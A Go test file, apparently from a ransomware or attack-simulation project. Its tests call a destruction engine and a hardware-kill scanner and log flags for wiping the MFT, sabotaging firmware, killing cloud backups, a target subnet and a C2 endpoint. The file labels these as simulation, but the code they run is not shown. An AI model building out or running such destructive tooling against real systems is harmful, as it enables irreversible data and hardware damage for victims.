package ransomware

import (
	"testing"
)

func TestNewDestructionEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDestructionEngine(cfg)
	if d == nil {
		t.Fatal("NewDestructionEngine() returned nil")
	}
}

func TestNewHardwareKillEngine(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h := NewHardwareKillEngine(cfg)
	if h == nil {
		t.Fatal("NewHardwareKillEngine() returned nil")
	}
}

func TestDestructionEngineDefaultState(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	d := NewDestructionEngine(cfg)

	result := d.ExecuteDestruction()
	if result == nil {
		t.Log("ExecuteDestruction returned nil (expected in simulation mode)")
	} else {
		t.Logf("Destruction result: %+v", result)
	}
}

func TestHardwareKillEngineScan(t *testing.T) {
	cfg := DefaultRansomwareConfig()
	h := NewHardwareKillEngine(cfg)

	vulns := h.ScanForVulnerableHardware()
	if len(vulns) == 0 {
		t.Log("ScanForVulnerableHardware returned 0 (expected in test env)")
	} else {
		t.Logf("Vulnerable hardware: %v", vulns)
	}
}

func TestDestructionConfigFlags(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	if cfg.MFTDestruct {
		t.Log("MFTDestruct enabled (simulation)")
	}
	if cfg.FirmwareSabotage {
		t.Log("FirmwareSabotage enabled (simulation)")
	}
	if cfg.CloudBackupKill {
		t.Log("CloudBackupKill enabled (simulation)")
	}
}

func TestHardwareKillConfig(t *testing.T) {
	cfg := DefaultRansomwareConfig()

	t.Logf("Target subnet: %s", cfg.TargetSubnet)
	t.Logf("C2 endpoint: %s", cfg.C2Endpoint)

	if cfg.TargetSubnet == "" {
		t.Error("TargetSubnet should not be empty in default config")
	}
}
